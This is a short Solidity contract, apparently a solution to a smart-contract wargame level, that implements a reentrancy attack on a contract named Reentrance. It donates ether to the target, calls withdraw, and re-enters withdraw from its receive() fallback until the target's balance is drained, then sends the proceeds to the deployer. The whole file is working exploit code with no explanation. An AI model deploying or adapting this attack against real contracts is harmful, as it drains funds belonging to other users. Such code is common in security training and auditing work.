// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function withdraw(uint _amount) external;

    function donate(address _to) external payable;
}

contract AttackReentrance {
    IReentrance private reentrance;
    address private owner;

    constructor(address _reentrance) public payable {
        owner = msg.sender;
        reentrance = IReentrance(_reentrance);
        reentrance.donate{value: msg.value}(address(this));
    }

    function attack() external {
        reentrance.withdraw(0.001 ether);

        (bool s, ) = payable(owner).call{value: address(this).balance}("");
        require(s);
    }

    receive() external payable {
        if (address(reentrance).balance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether);
        }
    }
}
